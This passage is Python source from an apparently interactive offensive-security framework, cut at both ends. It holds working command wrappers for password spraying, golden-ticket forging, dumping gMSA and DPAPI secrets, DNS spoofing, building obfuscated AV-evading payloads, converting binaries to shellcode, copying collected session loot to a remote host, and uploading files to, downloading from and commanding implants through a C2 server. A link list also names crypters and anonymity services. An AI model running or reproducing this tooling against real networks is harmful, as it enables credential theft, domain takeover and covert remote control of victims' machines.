                if not credentials:
                    return
                for username, password in credentials:
                    command =  f"cd {spraykatz_path} && ./spraykatz.py -u {username} -p {password} -t {target}"

            if not target:
                print_error("Target not defined in self.params['target'].")
                target = input("    [!] Enter the target (e.g., 192.168.1.0/24): ")

            print_msg(f"Executing: {command}")
            self.cmd(command)
            self.logcsv(f"spraykatz {command}")
        except Exception as e:
            print_error(f"Error: {e}")
        return

    @cmd2.with_category(command_and_control_category)
    def do_caldera(self, line):
        """
        Installs and starts the Caldera server.

        This function:
            - Clones the Caldera repository recursively.
            - Installs the required dependencies.
            - Optionally installs GoLang (1.19+).
            - Starts the Caldera server with the provided parameters.

        Behavior:
            - Requires `git`, `python3`, and `pip3` to be installed.
            - Uses parameters from `self.params` for version/release.

        Usage:
            caldera
        """
        path = os.getcwd()
        caldera_repo = "https://github.com/mitre/caldera.git"
        caldera_path = os.path.join(path, "external", ".exploit", "caldera")
        version = "x.x.x"

        try:
            if not os.path.exists(caldera_path):
                print_msg("Caldera is not installed. Installing...")
                self.cmd(f"git clone {caldera_repo} --recursive {caldera_path}")

            self.cmd(f"cd {caldera_path} && python3 -m venv env && source env/bin/activate && pip3 install -r requirements.txt")

            golang_installed = self.cmd("go version") == 0
            if not golang_installed:
                print_msg("GoLang is not installed. Installing GoLang (1.19+)...")
                self.cmd("wget https://golang.org/dl/go1.19.linux-amd64.tar.gz")
                self.cmd("sudo tar -C /usr/local -xzf go1.19.linux-amd64.tar.gz")
                self.cmd("export PATH=$PATH:/usr/local/go/bin")

            print_msg("Starting the Caldera server...")
            command = f"mv {caldera_path}/conf/default.yml {caldera_path}/conf/default.yml.bak"
            print_msg(command)
            self.cmd(command)
            file_path = f"{caldera_path}/conf/default.yml"
            create_caldera_config(file_path)
            command = f"cd {caldera_path} && python3 server.py --insecure --build"
            print_msg(command)
            self.cmd(command)
            self.logcsv(f"caldera {command}")
        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(exploitation_category)
    def do_ntpdate(self, line):
        """
        Synchronizes the system clock with a specified NTP server.

        This method constructs the target NTP server address using the domain and subdomain
        parameters. It then prompts the user to confirm or modify the target address.
        Finally, it executes the `ntpdate` command to synchronize the system clock with
        the specified NTP server.

        :param line: The command line input (not used in this method).
        :type line: str
        :return: None
        """
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        target = f"{subdomain}.{domain}"
        target = input(f"    [!] Enter the target to need to synchronize our clock (default:{target}) ") or target
        command = f" sudo ntpdate -u {target}"
        print_msg(command)
        self.cmd(command)
        self.logcsv(f"ticketer {command}")
        return

    @cmd2.with_category(exploitation_category)
    def do_ticketer(self, line):
        """
        Executes the Impacket ticketer tool to create a golden ticket.

        This function performs the following actions:
        1. Checks if the target host is valid.
        2. Prompts the user for the NTLM hash, domain SID, domain name, DC IP, SPN, and username.
        3. Constructs and executes the Impacket ticketer command with the provided information.

        Parameters:
        line (str): A command argument to determine the authentication mode.
                    This parameter is not used in this function.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        full_domain = f"{domain}.{subdomain}".upper()
        path = os.getcwd()

        if not is_binary_present("impacket-ticketer"):
            print_warn("impacket-ticketer is not installed. Installing dependencies.")
            self.cmd("sudo apt install impacket -y")

        if not check_rhost(rhost):
            return

        nthash = get_hash()
        domain_sid = input("    [!] Enter the domain SID: ")
        domain_name = input(f"    [!] Enter the domain name (default: {domain}): ") or domain
        dc_ip = input(f"    [!] Enter the DC IP (default: {rhost}): ") or rhost
        spn = input(f"    [!] Enter the SPN (default: nonexistent/{full_domain}): ") or f"nonexistent/{full_domain}"
        username = input("    [!] Enter the username (default: Administrator): ") or "Administrator"

        command = (f"impacket-ticketer -nthash {nthash} -domain-sid {domain_sid} "
                f"-domain {domain_name} -dc-ip {dc_ip} -spn {spn} {username}")
        self.cmd(command)

        return

    @cmd2.with_category(miscellaneous_category)
    def do_links(self, line=""):
        """
        Displays a list of useful links and allows the user to select and copy a link to the clipboard.

        This function performs the following actions:
        1. Defines a list of links with their aliases.
        2. Filters the links based on the input `line` if provided.
        3. Displays the filtered links with their aliases and URLs.
        4. Prompts the user to select a link by entering the corresponding number.
        5. Copies the selected link to the clipboard.

        Parameters:
        line (str, optional): A string to filter the links. If provided, only the links containing
                            the string in their alias or URL will be displayed. Defaults to an empty string.

        Returns:
        None
        """
        links = [
            ("Browser Leaks","https://browserleaks.com/"),
            ("CrackStation", "https://crackstation.net/"),
            ("Codebeautify", "https://codebeautify.org/ntlm-hash-generator"),
            ("CyberChef","https://gchq.github.io/CyberChef/"),
            ("Ioc", "https://ioc.one/"),
            ("Ip Info", "https://ipinfo.io/"),
            ("Mitre Navigator", "https://mitre-attack.github.io/attack-navigator/"),
            ("Threatfox Abuse", "https://threatfox.abuse.ch/browse/"),
            ("Threatminer", "https://www.threatminer.org/"),
            ("THC segfault (FREER00TSHELL)", "https://www.thc.org/segfault/"),
            ("Vpn Detector","https://ip.teoh.io/vpn-detection"),
            ("gsocket", "https://www.gsocket.io/"),
            ("linux-elf-runtime-crypter", "https://www.guitmz.com/linux-elf-runtime-crypter/"),
            ("Binary download", "https://bin.ajam.dev/"),
            ("cryptpad","https://cryptpad.fr/"),
            ("kycnot","https://kycnot.me/"),
            ("socks proxy list","https://spys.one/en/socks-proxy-list/"),
            ("Config ntlm2 BurpSuit", "https://portswigger.net/support/configuring-ntlm-with-burp-suite"),
            ("Facial recon","https://pimeyes.com/es")




        ]
        filtered_links = [(alias, cmd) for alias, cmd in links if line.lower() in alias.lower() or line.lower() in cmd.lower()] if line else links

        for idx, (alias, cmd) in enumerate(filtered_links):
            if cmd:
                print_msg(f"{idx + 1}{RESET}. Alias:{GREEN} {alias}{RESET}, Link:{CYAN} {cmd}")

        try:
            choice = int(input("    [!] Enter the number of the command you want to execute: ")) - 1
            if 0 <= choice < len(filtered_links):
                selected_cmd = filtered_links[choice]

                copy2clip(selected_cmd[1])
            else:
                print_error("Invalid choice. Please select a valid number.")
        except ValueError:
            print_error("Invalid input. Please enter a number.")
        self.logcsv(f"links {line}")
        return

    @cmd2.with_category(exfiltration_category)
    def do_rsync(self, line):
        """
        Synchronizes the local "sessions" directory to a remote host using rsync, leveraging sshpass for automated authentication.

        Steps:
            1. Verifies if the credentials file exists in the "sessions" directory.
            If not, prompts the user for a username and password.
            2. Reads the credentials file if it exists and extracts the username and password.
            3. Constructs an rsync command to deploy the "sessions" directory to the remote host.
            4. Executes the rsync command using the system shell.

        Args:
            line (str): Input command line (not used in the current implementation).

        Dependencies:
            - The `sshpass` command-line tool must be installed on the local machine.
            - `rsync` must be installed on both the local and remote machines.
            - The remote host must be accessible via SSH.

        Attributes:
            - `self.params`: Dictionary containing the following keys:
                - `username` (str, optional): Predefined username. Defaults to prompting the user if not provided.
                - `password` (str, optional): Predefined password. Defaults to prompting the user if not provided.
                - `rhost` (str): Remote host's IP or domain name.

        Raises:
            - KeyError: If `rhost` is not provided in `self.params`.
            - FileNotFoundError: If the "sessions" directory does not exist.

        Note:
            - The `credentials.txt` file, if present, should have credentials in the format `username:password`
            on the first line.

        Returns:
            None
        """

        path = os.getcwd()
        if line:
            tmp_path = line.strip()
        else:
            tmp_path = f"{path}/sessions"

        credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
        if not os.path.exists(credentials_path):
            username = self.params.get("username") or input("    [!] Enter the username: ")
            password = self.params.get("password") or input("    [!] Enter the password: ")
        else:
            credentials_path = get_users_dic("txt")
            with open(credentials_path, "r") as f:
                credentials = f.read().strip().split("\n")
                if credentials:
                    username, password = credentials[0].split(":")
                else:
                    username = self.params.get("username") or input("    [!] Enter the username: ")
                    password = self.params.get("password") or input("    [!] Enter the password: ")

        rhost = self.params["rhost"]
        print_msg("Deploying sessions directory.")

        rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/home/.grisun0"
        print_msg(rsync_command)
        self.cmd(rsync_command)

        return

    @cmd2.with_category(scanning_category)
    def do_pre2k(self, line):
        """
        Executes the pre2k tool to query the domain for pre-Windows 2000 machine accounts or to pass a list of hostnames to test authentication.

        This function:
            - Installs pre2k if not already installed.
            - Executes the pre2k command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `python3`, `python3-pip`, and `git` to be installed.
            - Uses parameters from `self.params` for domain, username, password, and target.

        Usage:
            pre2k auth -u <username> -p <password> -d <domain> -dc-ip <dc_ip>
            pre2k unauth -d <domain> -dc-ip <dc_ip> -inputfile <inputfile>
        """
        path = os.getcwd()
        pre2k_repo = "https://github.com/garrettfoster13/pre2k.git"
        pre2k_path = os.path.join(path, "external", ".exploit", "pre2k")

        try:
            if not os.path.exists(pre2k_path):
                print_msg("pre2k is not installed. Installing...")
                self.cmd(f"git clone {pre2k_repo} {pre2k_path}")
                self.cmd(f"cd {pre2k_path} && pip3 install .")

            command_parts = line.split()
            if not command_parts:
                print_error("No command specified. Use 'auth' or 'unauth'.")
                return

            command = command_parts[0]
            if command == "auth":
                credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
                if not os.path.exists(credentials_path):
                    username = self.params.get("username") or input("    [!] Enter the username: ")
                    password = self.params.get("password") or input("    [!] Enter the password: ")
                else:
                    credentials_path = get_users_dic("txt")
                    with open(credentials_path, "r") as f:
                        credentials = f.read().strip().split("\n")
                        if credentials:
                            username, password = credentials[0].split(":")
                        else:
                            username = self.params.get("username") or input("    [!] Enter the username: ")
                            password = self.params.get("password") or input("    [!] Enter the password: ")
                        domain = self.params["domain"]
                        dc_ip = self.params["rhost"]

                if not domain:
                    print_error("Domain not defined.")
                    domain = input("    [!] Enter the domain: ")

                if not dc_ip:
                    print_error("Domain controller IP not defined.")
                    dc_ip = input("    [!] Enter the domain controller IP: ")

                command = f"cd {pre2k_path} && pre2k auth -u {username} -p {password} -d {domain} -dc-ip {dc_ip}"

            elif command == "unauth":
                domain = self.params.get("domain")
                dc_ip = self.params.get("rhost")


                if not domain:
                    print_error("Domain not defined.")
                    domain = input("    [!] Enter the domain: ")

                if not dc_ip:
                    print_error("Domain controller IP not defined.")
                    dc_ip = input("    [!] Enter the domain controller IP: ")

                input_file = get_users_dic("txt")

                if input_file is None:
                    input_file = f"{path}/sessions/users.txt"

                if not input_file:
                    print_error("Input file not defined.")
                    input_file = input("    [!] Enter the input file path: ")

                command = f"cd {pre2k_path} && pre2k unauth -d {domain} -dc-ip {dc_ip} -save -inputfile {input_file} -outputfile {path}/sessions/pre2k_{dc_ip}.txt"

            else:
                print_error("Invalid command. Use 'auth' or 'unauth'.")
                return


            self.cmd(command)


        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(exfiltration_category)
    def do_gmsadumper(self, line):
        """
        Executes the gMSADumper tool to read and parse gMSA password blobs accessible by the user.

        This function:
            - Installs gMSADumper if not already installed.
            - Executes the gMSADumper command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `python3`, `python3-pip`, and `git` to be installed.
            - Uses parameters from `self.params` for domain, username, password, and target.

        Usage:
            gmsadumper -u <username> -p <password> -d <domain>
            gmsadumper -u <username> -p <LM:NT hash> -d <domain> -l <ldap_server>
            gmsadumper -k -d <domain> -l <ldap_server>
        """
        path = os.getcwd()
        gmsadumper_repo = "https://github.com/micahvandeusen/gMSADumper.git"
        gmsadumper_path = os.path.join(path, "external", ".exploit", "gMSADumper")

        try:
            if not os.path.exists(gmsadumper_path):
                print_msg("gMSADumper is not installed. Installing...")
                self.cmd(f"git clone {gmsadumper_repo} {gmsadumper_path}")

            domain = self.params.get("domain")
            subdomain = self.params.get("subdomain")
            ldap_server = f"{subdomain}.{domain}"

            credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
            if not os.path.exists(credentials_path):
                command = f"cd {gmsadumper_path} && python3 gMSADumper.py -k -d {domain} -l {ldap_server}"
            else:
                credentials_path = get_users_dic("txt")
                with open(credentials_path, "r") as f:
                    credentials = f.read().strip().split("\n")
                    if credentials:
                        username, password = credentials[0].split(":")
                    else:
                        username = self.params.get("username") or input("    [!] Enter the username: ")
                        password = self.params.get("password") or input("    [!] Enter the password: ")
                if not domain:
                    print_error("Domain not defined.")
                    domain = input("    [!] Enter the domain: ")
                if ldap_server:
                    command = f"cd {gmsadumper_path} && python3 gMSADumper.py -u {username} -p {password} -d {domain} -l {ldap_server}"
                else:
                    command = f"cd {gmsadumper_path} && python3 gMSADumper.py -u {username} -p {password} -d {domain}"
            self.cmd(command)

        except Exception as e:
            print_error(f"Error: {e}")
        return

    @cmd2.with_category(recon_category)
    def do_dnschef(self, line):
        """
        Executes the DNSChef tool to monitor DNS queries and intercept responses.

        This function:
            - Installs DNSChef if not already installed.
            - Executes the DNSChef command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `python3`, `python3-pip`, and `git` to be installed.
            - Uses parameters from `self.params` for domain, username, password, and target.

        Usage:
            dnschef
        """
        path = os.getcwd()
        dnschef_repo = "https://github.com/iphelix/dnschef.git"
        dnschef_path = os.path.join(path, "external", ".exploit", "dnschef")

        try:
            if not os.path.exists(dnschef_path):
                print_msg("DNSChef is not installed. Installing...")
                self.cmd(f"git clone {dnschef_repo} {dnschef_path}")
                self.cmd(f"cd {dnschef_path} && pip3 install -r requirements.txt")

            rhost = self.params["rhost"]
            domain = self.params["domain"]
            command = f"sudo python3 -W ignore {dnschef_path}/dnschef.py --fakeip {rhost} --fakedomains {domain}"
            self.cmd(command)
        except Exception as e:
            print_error(f"Error: {e}")
        return

    @cmd2.with_category(exfiltration_category)
    def do_dploot(self, line):
        """
        Executes the dploot tool to loot DPAPI related secrets from local or remote targets.
        Actions: backupkey,blob,browser,certificates,credentials,machinecertificates,machinecredentials,machinemasterkeys,machinevaults,masterkeys,mobaxterm,rdg,sccm,vaults,wam,wifi
        This function:
            - Installs dploot if not already installed.
            - Executes the dploot command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `python3`, `python3-pip`, and `git` to be installed.
            - Uses parameters from `self.params` for domain, username, password, and target.

        Usage:
            dploot <action> -d <domain> -u <username> -p <password> -t <target>
            dploot <action> -k -d <domain> -t <target>
        """
        path = os.getcwd()
        dploot_repo = "https://github.com/zblurx/dploot.git"
        dploot_path = os.path.join(path, "external", ".exploit", "dploot")

        try:
            if not os.path.exists(dploot_path):
                print_msg("dploot is not installed. Installing...")
                self.cmd(f"git clone {dploot_repo} {dploot_path}")
                self.cmd(f"cd {dploot_path} && pipx install .")
            if not line:
                action = input("    [!] Enter the action (backupkey,blob,browser,certificates,credentials,machinecertificates,machinecredentials,machinemasterkeys,machinetriage,machinevaults,masterkeys,mobaxterm,rdg,sccm,triage,vaults,wam,wifi) default: blob") or "blob"
            else:
                action = line.split()[0]
            rhost = self.params.get("rhost")
            domain = self.params.get("domain")
            subdomain = self.params.get("subdomain")
            ldap_server = f"{subdomain}.{domain}"

            credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
            if not os.path.exists(credentials_path):
                username = self.params.get("username") or input("    [!] Enter the username: ")
                password = self.params.get("password") or input("    [!] Enter the password: ")
                command = f"dploot {action} -d {domain} -u {username} -p '{password}' -t {rhost} "
            else:
                credentials_path = get_users_dic("txt")
                with open(credentials_path, "r") as f:
                    credentials = f.read().strip().split("\n")
                    if credentials:
                        username, password = credentials[0].split(":")
                    else:
                        username = self.params.get("username") or input("    [!] Enter the username: ")
                        password = self.params.get("password") or input("    [!] Enter the password: ")
                if not domain:
                    print_error("Domain not defined.")
                    domain = input("    [!] Enter the domain: ")

                command = f"dploot {action}  -d {domain} -u {username} -p '{password}' -t {rhost} "

            if action == "backupkey":
                args = " -quiet"
            elif action == "blob":
                blob = 'DFBE70A7E5CC19A398EBF1B96859CE5D'
                blob = input("    [!] Enter the blob: ") or blob
                args = f" -pvk key.pvk -blob '{blob}' "
            elif action == "browser":
                args = f" -mkfile {path}/sessions/masterkeys"
            elif action == "certificates":
                args = f" -mkfile {domain}.mkf"
            elif action == "credentials":
                args = f" -mkfile {domain}.mkf"
            elif action == "vaults":
                args = f" -mkfile {domain}.mkf"
            elif action == "rdg":
                args = f" -mkfile {domain}.mkf"
            elif action == "machinemasterkeys":
                args = f" "
            elif action == "machinecredentials":
                args = f" "
            elif action == "machinevaults":
                args = f" "
            elif action == "machinecertificates":
                args = f" "
            elif action == "wifi":
                args = f" "
            elif action == "sccm":
                args = f" "
            elif action == "mobaxterm":
                args = f" -pvk key.pvk"
            elif action == "wam":
                args = f" -pvk key.pvk"
            elif action == "masterkeys":
                choice = input("    [!] Enter 1 to domain backupkey or 2 with credentials") or "1"
                if choice == '1':
                    args = f" -pvk key.pvk"
                else:
                    credentials = get_credentials(True)
                    args = f" -passwords {credentials}"
            else:
                print_error("Action not found. Please use help dploot to view available options.")
                return
            self.cmd(f"{command} {args}")

        except Exception as e:
            print_error(f"Error: {e}")
        return

    @cmd2.with_category(reporting_category)
    def do_banners(self, line):
        """
        Extract and display banners from XML files in the 'sessions' directory.

        This function searches for XML files in the 'sessions' directory and extracts banner information from each file.
        The banner information includes the hostname, port, protocol, extra details, and service. If no XML files are found,
        an error message is displayed.

        Args:
            line (str): Not used in this function.

        Returns:
            None

        Example:
            banners
        """
        path = os.getcwd()
        sessions_dir = f'{path}/sessions'
        xml_files = [f for f in os.listdir(sessions_dir) if f.endswith('.xml')]

        if not xml_files:
            print_error("No XML files found in the 'sessions' directory.")
            return
        banners_json = []
        print_msg("Available XML files:")
        for idx, file in enumerate(xml_files):
            banners = extract_banners(f"{sessions_dir}/{file}")
            for banner in banners:
                print_msg(f"Hostname: {banner['hostname']}")
                print_msg(f"Port: {banner['port']}")
                print_msg(f"Protocol: {banner['protocol']}")
                print_msg(f"Extra: {banner['banner']}")
                print_msg(f"Service: {banner['service']}")
                print_msg('-' * 40)
                banners_json.append({
                    "hostname": banner['hostname'],
                    "port": banner['port'],
                    "protocol": banner['protocol'],
                    "extra": banner['banner'],
                    "service": banner['service']
                })

        with open('sessions/banners.json', 'w') as json_file:
            json.dump(banners_json, json_file, indent=4)

    @cmd2.with_category(post_exploitation_category)
    def do_createpayload(self, line):
        """
        Generates an obfuscated payload to evade AV detection using the payloadGenerator tool. thanks to smokeme

        This function:
            - Clones the payloadGenerator repository if not already cloned.
            - Installs .NET Framework 4.5 if not already installed.
            - Executes the generator.py script with the provided IP, port, and XOR key.
            - Displays the result in the terminal.
        Parameters:
            line (str): lenght of xor key
        Behavior:
            - Requires `git` and `dotnet` to be installed.
            - Uses parameters from `self.params` for IP, port, and XOR key.

        Usage:
            createpayload
        """
        path = os.getcwd()
        generator_repo = "https://github.com/smokeme/payloadGenerator.git"
        generator_path = os.path.join(path, "external", ".exploit", "payloadGenerator")
        dotnet_installer = "dotNetFx45_Full_x86_x64.exe"
        dotnet_url = "https://download.microsoft.com/download/b/a/4/ba4a7e71-2906-4b2d-a0e1-80cf586c6f56/dotNetFx45_Full_x86_x64.exe"

        try:
            if not os.path.exists(generator_path):
                print_msg("payloadGenerator is not installed. Installing...")
                self.cmd(f"git clone {generator_repo} {generator_path}")

            if not os.path.exists(os.path.join(generator_path, dotnet_installer)):
                print_msg("Downloading .NET Framework 4.5 installer...")
                self.cmd(f"wget {dotnet_url} -O {os.path.join(generator_path, dotnet_installer)}")
                self.cmd(f"winecfg && ")
                print_msg("Installing .NET Framework 4.5 using Wine...")
                self.cmd(f"wine {os.path.join(generator_path, dotnet_installer)}")
            if line:
                lenght = line.strip()
            else:
                lenght = 22
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            xor_key = generate_xor_key(lenght)

            command = f"cd {generator_path} && wine ./generate.py -ip {lhost} -port {lport} -key {xor_key}"
            self.cmd(command)
        except Exception as e:
            print_error(f"Error: {e}")
        return

    @cmd2.with_category(post_exploitation_category)
    def do_bin2shellcode(self, line):
        """
        Converts a binary file to a shellcode string in C or Nim format.

        This function:
            - Reads a binary file and converts its contents to a shellcode string.
            - Supports both C and Nim formats.
            - Displays the result in the terminal and saves it to a file.

        Behavior:
            - Requires the filename, width, quotes, and format parameters.
            - Uses default values if parameters are not provided.
            - Uses parameters from `self.params` for filename, width, quotes, and format.

        Usage:
            bin2shellcode [<filename> [<width> [<quotes> [<format>]]]]
            bin2shellcode sessions/shellcode.bin 20 True c
        """
        path = os.getcwd()
        default_filename = f"{path}/sessions/shellcode.bin"
        default_width = 20
        default_quotes = True
        default_format = "c"

        params = line.split()
        filename = params[0] if len(params) > 0 else default_filename
        width = int(params[1]) if len(params) > 1 else default_width
        quotes = params[2].lower() == 'true' if len(params) > 2 else default_quotes
        format = params[3].lower() if len(params) > 3 else default_format

        if not os.path.exists(filename):
            print_error(f"{filename} is not found.")
            return

        output_filename = f"{os.path.splitext(filename)[0]}.{format}"

        try:
            with open(filename, 'rb') as file, open(output_filename, 'w') as output_file:
                file_size = os.path.getsize(filename)
                counter = 0

                if format == "c":
                    if quotes:
                        output_file.write('"')
                        print('"', end='')

                    while (byte := file.read(1)):
                        output_file.write(f"\\x{byte.hex()}")
                        print(f"\\x{byte.hex()}", end='')
                        counter += 1

                        if width != 0 and counter >= width:
                            if quotes:
                                output_file.write('"')
                                print('"')
                            output_file.write('\n')
                            print()
                            counter = 0
                            if quotes:
                                output_file.write('"')
                                print('"', end='')

                    if quotes:
                        output_file.write('"')
                        print('"')


                elif format == "nim":
                    output_file.write(f"var shellcode: array[{file_size}, byte] = [\nbyte ")
                    print(f"var shellcode: array[{file_size}, byte] = [\nbyte ", end='')

                    while (byte := file.read(1)):
                        output_file.write(f"0x{byte.hex()}, ")
                        print(f"0x{byte.hex()}, ", end='')
                        counter += 1

                        if width != 0 and counter >= width:
                            output_file.write('\n')
                            print()
                            counter = 0

                    output_file.write(" ]")
                    print(" ]")

                else:
                    print_error("Unsupported format. Use 'c' or 'nim'.")

        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(miscellaneous_category)
    def do_news(self, line):
        """
        Show the Hacker News in the terminal.

        Parameters:
            line (str): optional
        Return None
        """
        titles, links, scores = scrape_news()
        display_news(titles, links, scores)
        return

    @cmd2.with_category(reporting_category)
    def do_vulns(self, line):
        """
        Scan for vulnerabilities based on a provided service banner.

        This function initializes a vulnerability scanner and searches for CVEs (Common Vulnerabilities and Exposures)
        related to the specified service banner. If no service banner is provided, it prompts the user to enter one.

        Args:
            line (str): The service banner to search for vulnerabilities. If not provided, the user will be prompted to enter one.

        Returns:
            None

        Example:
            do_vulns "ProFTPD 1.3.5"
        """
        scanner = VulnerabilityScanner()
        if line:
            servicio = line.strip()
        else:
            servicio = input("    [!] Enter the banner to search vulnerability: ") or "ProFTPD 1.3.5"

        cves_encontrados = scanner.search_cves(servicio)
        scanner.pretty_print(cves_encontrados)
        return

    @cmd2.with_category(post_exploitation_category)
    def do_exe2bin(self, line):
        """
        Trasnform file .exe into binary file.

        Args:
            line (str): Ruta del archivo ejecutable .exe.

        Return shellcode.bin file in sessions directory
        """
        if line:
            input_exe = line.strip()
        else:
            input_exe = get_users_dic('exe')
        path = os.getcwd()
        output_bin = f"{path}/sessions/shellcode.bin"
        try:
            with open(input_exe, 'rb') as exe_file:
                exe_data = exe_file.read()

            with open(output_bin, 'wb') as bin_file:
                bin_file.write(exe_data)

            print_msg(f"El archivo {input_exe} ha sido convertido a {output_bin}.")
        except Exception as e:
            print_error(f"Error: {e}")

    @cmd2.with_category(post_exploitation_category)
    def do_atomic_lazyown(self, line):
        """
        Genera y ejecuta pruebas de Atomic Red Team usando el C2.

        Parameters:
        line (str): Lista de IDs de técnicas separadas por espacios.

        Returns:
        None
        """
        if not line:
            print_warn("No technique IDs provided.")
            return

        technique_ids = line.split()
        for technique_id in technique_ids:
            self.do_atomic_gen(technique_id)

        sessions_path = os.path.join(os.getcwd(), "sessions")
        test_scripts = glob.glob(os.path.join(sessions_path, "atomic_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_test_*.ps1"))
        clean_test_scripts = glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.sh")) + glob.glob(os.path.join(sessions_path, "atomic_clean_test_*.ps1"))

        if not test_scripts or not clean_test_scripts:
            print_warn("No test or clean test scripts found in the sessions directory.")
            return

        extension = ".sh" if test_scripts[0].endswith(".sh") else ".ps1"
        if extension == ".sh":
            atomic_agent_content = "\n".join([f"/bin/sh {os.path.basename(script)}" for script in test_scripts])
        else:
            atomic_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', '{os.path.basename(script)}' -Verb RunAs" for script in test_scripts])
        atomic_agent_path = os.path.join(sessions_path, f"atomic_agent{extension}")
        with open(atomic_agent_path, "w") as f:
            f.write(atomic_agent_content)

        if extension == ".sh":
            atomic_clean_agent_content = "\n".join([f"/bin/bash {os.path.basename(script)}" for script in clean_test_scripts])
        else:
            atomic_clean_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', '{os.path.basename(script)}' -Verb RunAs" for script in clean_test_scripts])
        atomic_clean_agent_path = os.path.join(sessions_path, f"atomic_clean_agent{extension}")
        with open(atomic_clean_agent_path, "w") as f:
            f.write(atomic_clean_agent_content)

        for script in test_scripts + clean_test_scripts + [atomic_agent_path, atomic_clean_agent_path]:
            self.upload_file_to_c2(script)
        if extension == ".sh":
            self.issue_command_to_c2(f"/bin/bash {os.path.basename(atomic_agent_path).replace(sessions_path, '')}")
        else:
            self.issue_command_to_c2(f"Start-Process powershell.exe -ArgumentList '-File', '{os.path.basename(atomic_agent_path).replace(sessions_path, '')}' -Verb RunAs")
        return

    @cmd2.with_category(lateral_movement_category)
    def upload_file_to_c2(self, file_path, clientid = None):
        """
        Sube un archivo al C2.

        Parameters:
        file_path (str): Ruta del archivo a subir.

        Returns:
        None
        """
        if not clientid:
            clientid = input (f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid

        data = {"client_id": clientid}
        with open(file_path, "rb") as f:
            files = {"file": f}
            response = requests.post(f"{self.c2_url}/download_file", auth=self.c2_auth, files=files, data=data, verify=False)
            if response.status_code == 200:
                return f"File {file_path} uploaded successfully."

            else:
                return f"Failed to upload file {file_path}. Status code: {response.status_code}"

    @cmd2.with_category(lateral_movement_category)
    def do_upload_c2(self, line):
        """
        upload command in the client using the C2 to upload a file

        Parameters:
        command (str): client_id [optional], Command to exec.

        Returns:
        None
        """
        if line:
            parts = line.split(maxsplit=1)
            nparts = len(parts)
            if nparts == 1:
                self.upload_file_to_c2(line)
            elif nparts == 2:
                user = parts[0]
                path_file = parts[1]
                print_msg(f"implant: {user} file: {path_file} ")
                response = self.upload_file_to_c2(path_file, user)
                print(response)
            else:
                print_error("Error")
        else:
            print("else")
            line = input ("    [!] Enter the path: ") or 'puertos'
            self.upload_file_to_c2(line)


    def complete_upload_c2(self, text, line, begidx, endidx):
        """Autocomplete implant names from implant_config_*.json files in sessions/ directory"""
   
        config_dir = self.sessions_dir
        pattern = os.path.join(config_dir, "implant_config_*.json")
        
        implant_names = []

        config_files = glob.glob(pattern)
        
        for file_path in config_files:
            try:
                with open(file_path, 'r') as f:
                    data = json.load(f)
                    name = data.get("name")
                    if name:
                        implant_names.append(name)
            except (json.JSONDecodeError, IOError) as e:

                continue

   
        implant_names.sort()

        if not text:
            return implant_names

        return [name for name in implant_names if name.startswith(text)]

    @cmd2.with_category(exfiltration_category)
    def download_file_from_c2(self, file_name, clientid=""):
        """
        Descarga un archivo desde el C2.

        Parameters:
        file_name (str): Nombre del archivo a descargar.
        clientid (str): Identificador del cliente (opcional).

        Returns:
        None
        """
        if clientid == "":
            clientid = input(f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
        path = os.getcwd()
        sessions = f"{path}/sessions/uploads"
        file_name = os.path.basename(file_name)
        output = f"{sessions}/{file_name}"
        command = f"upload:{file_name}"
        data = {"client_id": clientid, "command": command}
        response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=False)

        if response.status_code == 200:
            with open(output, 'wb') as f:
                f.write(response.content)
            print_msg(f"File {file_name} downloaded successfully.")
        else:
            print_error(f"Failed to download file {file_name}. Status code: {response.status_code}")

    @cmd2.with_category(exfiltration_category)
    def do_download_c2(self, line):
        """
        Download a file from the C2.

        Parameters:
        line (str): Command input in the format "client_id file_name".

        Returns:
        None
        """
        if line:
            parts = line.split(maxsplit=1)
            nparts = len(parts)
            if nparts == 1:
                file_name = parts[0]
                clientid = input(f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
                self.download_file_from_c2(file_name, clientid)
            elif nparts == 2:
                clientid = parts[0]
                file_name = parts[1]
                print_msg(f"implant: {clientid} file: {file_name}")
                self.download_file_from_c2(file_name, clientid)
            else:
                print_error("Error: Invalid input format. Use 'client_id file_name' or 'file_name'.")
        else:
            # If no input is provided, prompt for file name and client ID
            file_name = input("    [!] Enter the file name: ")
            clientid = input(f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
            self.download_file_from_c2(file_name, clientid)

    def complete_download_c2(self, text, line, begidx, endidx):
        """Autocomplete implant names from implant_config_*.json files in sessions/ directory"""
   
        config_dir = self.sessions_dir
        pattern = os.path.join(config_dir, "implant_config_*.json")
        
        implant_names = []

        config_files = glob.glob(pattern)
        
        for file_path in config_files:
            try:
                with open(file_path, 'r') as f:
                    data = json.load(f)
                    name = data.get("name")
                    if name:
                        implant_names.append(name)
            except (json.JSONDecodeError, IOError) as e:

                continue

   
        implant_names.sort()

        if not text:
            return implant_names

        return [name for name in implant_names if name.startswith(text)]


    @cmd2.with_category(post_exploitation_category)
    def issue_command_to_c2(self, command, client_id=""):
        """
        Ejecuta un comando en el cliente usando el C2.

        Parameters:
        command (str): Comando a ejecutar.
